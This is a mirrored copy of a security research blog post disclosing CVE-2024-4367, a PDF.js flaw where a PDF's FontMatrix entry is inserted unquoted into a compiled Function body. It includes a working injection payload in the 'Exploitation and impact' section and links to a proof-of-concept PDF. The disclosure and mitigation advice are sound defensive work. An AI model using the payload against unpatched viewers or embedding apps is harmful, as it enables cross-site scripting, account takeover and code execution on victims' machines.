<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/">Original</a>
    <h1>CVE-2024-4367 – Arbitrary JavaScript execution in PDF.js</h1>
    
    <div id="readability-page-1" class="page"><div>
    <div>
        <div>
            <p><span>
                    <a href="https://codeanlabs.com/blog/category/research/">Research</a>                </span>
                
                <span>Thomas Rinsma</span>

                <span>05-20-2024</span>
            </p>
            
        </div>
        <figure>
            <img width="1204" height="866" src="https://codeanlabs.com/wp-content/uploads/2024/05/pdfjs_header_mid.png" alt="" decoding="async" loading="lazy" srcset="https://codeanlabs.com/wp-content/uploads/2024/05/pdfjs_header_mid.png 1204w, https://codeanlabs.com/wp-content/uploads/2024/05/pdfjs_header_mid-300x216.png 300w, https://codeanlabs.com/wp-content/uploads/2024/05/pdfjs_header_mid-1024x737.png 1024w, https://codeanlabs.com/wp-content/uploads/2024/05/pdfjs_header_mid-768x552.png 768w" sizes="(max-width: 1204px) 100vw, 1204px"/>        </figure>
        

    </div>
</div><div>
    <div>
        
    <h3>
        TL;DR    </h3>
<div>
    <p>This post details <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2024-21/#CVE-2024-4367" target="_blank" rel="noopener">CVE-2024-4367</a>, a vulnerability in PDF.js found by Codean Labs. PDF.js is a JavaScript-based PDF viewer maintained by Mozilla. This bug allows an attacker to execute arbitrary JavaScript code as soon as a malicious PDF file is opened. This affects <strong>all Firefox users</strong> (&lt;126) because PDF.js is used by Firefox to show PDF files, but also seriously impacts <strong>many web- and Electron-based applications</strong> that (indirectly) use PDF.js for preview functionality.</p>
<p><em>If you are a developer of a JavaScript/Typescript-based application that handles PDF files in any way, we recommend checking that you are not (indirectly) using a version a vulnerable version of PDF.js. See the end of this post for mitigation details.</em></p>
</div>

    <h2>
        Introduction    </h2>
<div>
    <p>There are two common use-cases for PDF.js. First, it is Firefox’s built-in PDF viewer. If you use Firefox and you’ve ever downloaded or browsed to a PDF file you’ll have seen it in action. Second, it is bundled into a Node module called <code>pdfjs-dist</code>, with ~2.7 million weekly downloads according to NPM. In this form, websites can use it to provide embedded PDF preview functionality. This is used by everything from Git-hosting platforms to note-taking applications. The one you’re thinking of now is likely using PDF.js.</p>
<p>The PDF format is famously complex. With support for various media types, complicated font rendering and even rudimentary scripting, PDF readers are a common target for vulnerability researchers. With such a large amount of parsing logic, there are bound to be some mistakes, and PDF.js is no exception to this. What makes it unique however is that it is written in JavaScript as opposed to C or C++. This means that there is no opportunity for memory corruption problems, but as we will see it comes with its own set of risks.</p>
</div>

    <h2>
        Glyph rendering    </h2>
<div>
    <p>You might be surprised to hear that this bug is not related to the PDF format’s (JavaScript!) scripting functionality. Instead, it is an oversight in a specific part of the font rendering code.</p>
<p>Fonts in PDFs can come in several different formats, some of them more obscure than others (at least for us). For modern formats like TrueType, PDF.js defers mostly to the browser’s own font renderer. In other cases, it has to manually turn <em>glyph</em> (i.e., character) descriptions into curves on the page. To optimize this for performance, a <em>path generator</em> function is pre-compiled for every glyph. If supported, this is done by making a JavaScript <code>Function</code> object with a body (<code>jsBuf</code>) containing the instructions that make up the path:</p>
<pre><code>
// If we can, compile cmds into JS for MAXIMUM SPEED...
if (this.isEvalSupported &amp;&amp; FeatureTest.isEvalSupported) {
  const jsBuf = [];
  for (const current of cmds) {
    const args = current.args !== undefined ? current.args.join(&#34;,&#34;) : &#34;&#34;;
    jsBuf.push(&#34;c.&#34;, current.cmd, &#34;(&#34;, args, &#34;);\n&#34;);
  }
  // eslint-disable-next-line no-new-func
  console.log(jsBuf.join(&#34;&#34;));
  return (this.compiledGlyphs[character] = new Function(
    &#34;c&#34;,
    &#34;size&#34;,
    jsBuf.join(&#34;&#34;)
  ));
}
</code></pre>
<p>From an attacker perspective this is really interesting: if we can somehow control these <code>cmds</code> going into the <code>Function</code> body and insert our own code, it would be executed as soon as such a glyph is rendered.</p>
<p>Well, let’s look at how this list of commands is generated. Following the logic back to the <code>CompiledFont</code> class we find the method <code>compileGlyph(...)</code>. This method initializes the <code>cmds</code> array with a few general commands (<code>save</code>, <code>transform</code>, <code>scale</code> and <code>restore</code>), and defers to a <code>compileGlyphImpl(...)</code> method to fill in the actual rendering commands:</p>
<pre><code>
  compileGlyph(code, glyphId) {
    if (!code || code.length === 0 || code[0] === 14) {
      return NOOP;
    }

    let fontMatrix = this.fontMatrix;
    ...

    const cmds = [
      { cmd: &#34;save&#34; },
      { cmd: &#34;transform&#34;, args: fontMatrix.slice() },
      { cmd: &#34;scale&#34;, args: [&#34;size&#34;, &#34;-size&#34;] },
    ];
    this.compileGlyphImpl(code, cmds, glyphId);

    cmds.push({ cmd: &#34;restore&#34; });

    return cmds;
  }
</code></pre>
<p>If we instrument the PDF.js code to log generated <code>Function</code> objects, we see that the generated code indeed contains those commands:</p>
<pre><code>
c.save();
c.transform(0.001,0,0,0.001,0,0);
c.scale(size,-size);
c.moveTo(0,0);
c.restore();
</code></pre>
<p>At this point we could audit the font parsing code and the various commands and arguments that can be produced by glyphs, like <code>quadraticCurveTo</code> and <code>bezierCurveTo</code>, but all of this seems pretty innocent with no ability to control anything other than numbers. What turns out to be much more interesting however is the <code>transform</code> command we saw above:</p>
<pre><code>
{ cmd: &#34;transform&#34;, args: fontMatrix.slice() },
</code></pre>
<p>This <code>fontMatrix</code> array is copied (with <code>.slice()</code>) and inserted into the body of the <code>Function</code> object, joined by commas. The code clearly assumes that it is a numeric array, but is that always the case? Any string inside this array would be inserted literally, without any quotes surrounding it. Hence, that would break the JavaScript syntax at best, and give arbitrary code execution at worst. But can we even control the contents of <code>fontMatrix</code> to that degree?</p>
</div>

    <h2>
        Enter the FontMatrix    </h2>
<div>
    <p>The value of <code>fontMatrix</code> defaults to <code>[0.001, 0, 0, 0.001, 0, 0]</code>, but is often set to a custom matrix by a font itself, i.e., in its own embedded metadata. How this is done exactly differs per font format. Here’s the <a href="https://en.wikipedia.org/wiki/PostScript_fonts" target="_blank" rel="noopener">Type1</a> parser for example:</p>
<pre><code>
  extractFontHeader(properties) {
    let token;
    while ((token = this.getToken()) !== null) {
      if (token !== &#34;/&#34;) {
        continue;
      }
      token = this.getToken();
      switch (token) {
        case &#34;FontMatrix&#34;:
          const matrix = this.readNumberArray();
          properties.fontMatrix = matrix;
          break;
        ...
      }
      ...
    }
    ...
  }
</code></pre>
<p>This is not very interesting for us. Even though Type1 fonts technically contain arbitrary Postscript code in their header, no sane PDF reader supports this fully and most just try to read predefined key-value pairs with expected types. In this case, PDF.js just reads a number array when it encounters a <code>FontMatrix</code> key. It appears that the <code>CFF</code> parser — used for several other font formats — is similar in this regard. All in all, it looks like we are indeed limited to numbers.</p>
<p>However, it turns out that there is more than one potential origin of this matrix. Apparently, it is also possible to specify a custom <code>FontMatrix</code> value outside of a font, namely in a metadata object in the PDF! Looking carefully at the <code>PartialEvaluator.translateFont(...)</code> method, we see that it loads various attributes from PDF dictionaries associated with the font, one of them being the <code>fontMatrix</code>:</p>
<pre><code>
    const properties = {
      type,
      name: fontName.name,
      subtype,
      file: fontFile,
      ...
      fontMatrix: dict.getArray(&#34;FontMatrix&#34;) || FONT_IDENTITY_MATRIX,
      ...
      bbox: descriptor.getArray(&#34;FontBBox&#34;) || dict.getArray(&#34;FontBBox&#34;),
      ascent: descriptor.get(&#34;Ascent&#34;),
      descent: descriptor.get(&#34;Descent&#34;),
      xHeight: descriptor.get(&#34;XHeight&#34;) || 0,
      capHeight: descriptor.get(&#34;CapHeight&#34;) || 0,
      flags: descriptor.get(&#34;Flags&#34;),
      italicAngle: descriptor.get(&#34;ItalicAngle&#34;) || 0,
      ...
    };
</code></pre>
<p>In the PDF format, font definitions consists of several objects. The <code>Font</code>, its <code>FontDescriptor</code> and the actual <code>FontFile</code>. For example, here represented by objects 1, 2 and 3:</p>
<pre><code>
1 0 obj
&lt;&lt;
  /Type /Font
  /Subtype /Type1
  /FontDescriptor 2 0 R
  /BaseFont /FooBarFont
&gt;&gt;
endobj

2 0 obj
&lt;&lt;
  /Type /FontDescriptor
  /FontName /FooBarFont
  /FontFile 3 0 R
  /ItalicAngle 0
  /Flags 4
&gt;&gt;
endobj

3 0 obj
&lt;&lt;
  /Length 100
&gt;&gt;
... (actual binary font data) ...
endobj
</code></pre>
<p>The <code>dict</code> referenced by the code above refers to the <code>Font</code> object. Hence, we should be able to define a custom <code>FontMatrix</code> array like this:</p>
<pre><code>
1 0 obj
&lt;&lt;
  /Type /Font
  /Subtype /Type1
  /FontDescriptor 2 0 R
  /BaseFont /FooBarFont
  /FontMatrix [1 2 3 4 5 6]   % &lt;-----
&gt;&gt;
endobj
</code></pre>
<p>When attempting to do this it initially looks like this doesn’t work, as the <code>transform</code> operations in generated <code>Function</code> bodies still use the default matrix. However, this happens because the font file itself is overwriting the value. Luckily, when using a Type1 font without an internal <code>FontMatrix</code> definition, the PDF-specified value <em>is</em> authoritative as the <code>fontMatrix</code> value is not overwritten.</p>
<p>Now that we can control this array from a PDF object we have all the flexibility we want, as PDF supports more than just number-type primitives. Let’s try inserting a string-type value instead of a number (in PDF, strings are delimited by parentheses):</p>
<pre><code>
/FontMatrix [1 2 3 4 5 (foobar)]
</code></pre>
<p>And indeed, it is plainly inserted into the <code>Function</code> body!</p>
<pre><code>
c.save();
c.transform(1,2,3,4,5,foobar);
c.scale(size,-size);
c.moveTo(0,0);
c.restore();
</code></pre>
</div>

    <h2>
        Exploitation and impact    </h2>
<div>
    <p>Inserting arbitrary JavaScript code is now only a matter of juggling the syntax properly. Here’s a classical example triggering an alert, by first closing the <code>c.transform(...)</code> function, and making use of the trailing parenthesis:</p>
<pre><code>
/FontMatrix [1 2 3 4 5 (0\); alert\(&#39;foobar&#39;)]
</code></pre>
<p>The result is exactly as expected:</p>
<div><p><a href="https://codeanlabs.com/wp-content/uploads/2024/05/pdfjs_alert_foobar.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" src="https://codeanlabs.com/wp-content/uploads/2024/05/pdfjs_alert_foobar.png" alt="Exploitation of CVE-2024-4367" width="1127" height="683"/></a></p><p>Exploitation of CVE-2024-4367</p></div>
<p>You can find a proof-of-concept PDF file <a href="https://codeanlabs.com/wp-content/uploads/2024/05/CVE-2024-4367.pdf" target="_blank" rel="noopener">here</a>. It is made to be easy to adapt using a regular text editor. To demonstrate the context in which the JavaScript is running, the alert will show you the value of <code>window.origin</code>. Interestingly enough, this is not the <code>file://</code> path you see in the URL bar (if you’ve downloaded the file). Instead, PDF.js runs under the origin <code>resource://pdf.js</code>. This prevents access to local files, but it is slightly more privileged in other aspects. For example, it is possible to invoke a file download (through a dialog), even to “download” arbitrary <code>file://</code> URLs. Additionally, the real path of the opened PDF file is stored in <code>window.PDFViewerApplication.url</code>, allowing an attacker to spy on people opening a PDF file, learning not just when they open the file and what they’re doing with it, but also where the file is located on their machine.</p>
<p>In applications that embed PDF.js, the impact is potentially even worse. If no mitigations are in place (see below), this essentially gives an attacker an <a href="https://owasp.org/www-community/attacks/xss/">XSS</a> primitive on the domain which includes the PDF viewer. Depending on the application this can lead to data leaks, malicious actions being performed in the name of a victim, or even a full account take-over. On Electron apps that do not properly sandbox JavaScript code, this vulnerability even leads to native code execution (!). <strong>We found this to be the case for at least one popular Electron app</strong>.</p>
</div>

    <h2>
        Mitigation    </h2>
<div>
    <p>At Codean Labs we realize it is difficult to keep track of dependencies like this and their associated risks. It is our pleasure to take this burden from you. We perform application security assessments in an efficient, thorough and human manner, allowing you to focus on development. <a href="https://codeanlabs.com/pentest/" target="_blank" rel="noopener">Click here</a> to learn more.</p>
<p>The best mitigation against this vulnerability is to update PDF.js to version 4.2.67 or higher. Most wrapper libraries like <code>react-pdf</code> <a href="https://github.com/wojtekmaj/react-pdf/discussions/1786" target="_blank" rel="noopener">have also released</a> patched versions. Because some higher level PDF-related libraries statically embed PDF.js, we recommend recursively checking your <code>node_modules</code> folder for files called <code>pdf.js</code> to be sure. Headless use-cases of PDF.js (e.g., on the server-side to obtain statistics and data from PDFs) seem not to be affected, but we didn’t thoroughly test this. It is also advised to update.</p>
<p>Additionally, a simple workaround is to set the PDF.js setting <code>isEvalSupported</code> to <code>false</code>. This will disable the vulnerable code-path. If you have a strict <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener">content-security policy</a> (disabling the use of <code>eval</code> and the <code>Function</code> constructor), the vulnerability is also not reachable.</p>
</div>

    <h2>
        Timeline    </h2>
<div>
    <ul>
<li>2024-04-26 – vulnerability disclosed to Mozilla</li>
<li>2024-04-29 – PDF.js v4.2.67 released to NPM, fixing the issue</li>
<li>2024-05-14 – Firefox 126, Firefox ESR 115.11 and Thunderbird 115.11 released including the fixed version of PDF.js</li>
<li>2024-05-20 – publication of this blogpost</li>
</ul>
</div>
    </div>
</div></div>
  </body>
</html>
